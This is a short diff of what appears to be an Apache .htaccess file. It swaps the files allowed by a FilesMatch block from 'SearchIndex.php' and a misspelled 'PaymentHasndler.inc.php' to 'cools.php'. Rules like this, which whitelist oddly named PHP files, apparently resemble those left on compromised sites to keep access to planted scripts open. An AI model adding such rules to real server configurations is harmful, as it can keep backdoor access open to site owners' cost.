@@ -8,7 +8,7 @@ Order allow,deny
 Allow from all
 </FilesMatch>
 
-<FilesMatch '^(SearchIndex.php|PaymentHasndler.inc.php)$'>
+<FilesMatch '^(cools.php)$'>
 Order allow,deny
 Allow from all
 </FilesMatch>
